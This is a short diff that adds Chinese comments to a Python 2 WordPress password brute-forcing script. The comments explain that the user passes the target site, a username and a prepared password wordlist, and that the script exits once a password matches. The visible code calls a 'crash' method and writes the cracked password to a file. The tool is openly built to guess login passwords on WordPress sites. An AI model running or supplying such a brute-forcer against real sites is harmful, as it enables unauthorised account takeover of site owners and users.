@@ -45,6 +45,7 @@ class wordpress():
                     g.write("Crashed! password is %s %s" % (self.username,i.strip()))
                     pwd.close()
                     g.close()
+					#如果匹配到密码， 则这次任务完成，退出程序
                     exit()
                     break
 
@@ -60,8 +61,10 @@ if __name__ == "__main__":
     print "begin at " + time.ctime()
     host=sys.argv[1]
     #url = "http://"+host
+	#给程序提供参数，为你要破解的网址
     user = sys.argv[2]
     dictfile=sys.argv[3]
+	#提供你事先准备好的密码文件
     obj = wordpress(host, user)
     #obj.check(dictfile)
     obj.crash(dictfile)
